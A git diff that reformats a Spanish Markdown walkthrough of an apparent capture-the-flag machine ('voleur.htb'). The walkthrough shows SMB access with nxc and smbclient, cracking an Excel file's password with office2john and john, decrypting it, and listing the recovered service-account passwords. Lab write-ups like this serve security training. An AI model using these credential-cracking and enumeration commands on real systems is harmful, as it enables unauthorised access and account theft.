@@ -128,13 +128,17 @@ ini
 🚪 Acceso Inicial
 🔑 Credenciales Iniciales
 
+
+```
 bash
 nxc smb dc.voleur.htb -u 'ryan.naylor' -p 'HollowOct31Nyt' -k
+```
 
 📂 Enumeración de Recursos SMB
+```
 bash
 KRB5CCNAME=ryan.naylor.ccache smbclient.py -k dc.voleur.htb
-
+```
 
 smb
 smb: \> use IT
@@ -145,25 +149,34 @@ smb: \IT\First-Line Support\> get Access_Review.xlsx
 
     Extraer el Hash:
 
+```
 bash
 office2john Access_Review.xlsx > hash.txt
-
+```
     Crackear la Contraseña:
     
+
+```
 bash
 john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+```
 
 ¡Contraseña Encontrada!: football1
 
     Descifrar el Archivo:
 
+```
 bash
 python3 -m msoffcrypto -p football1 Access_Review.xlsx decrypted.xlsx
-
+```
 🗝️ Credenciales Obtenidas
-Usuario	Contraseña
-svc_ldap	M1XyC9pW7qT5Vn
-svc_iis	N5pXyV1WqM7CZ8
+
+|Usuario | Contraseña     |
+|--------|----------------|
+|svc_ldap| M1XyC9pW7qT5Vn |
+|svc_iis | N5pXyV1WqM7CZ8 |
+|-------------------------|
+
 🔄 Movimiento Lateral
 🩸 Análisis con BloodHound
 
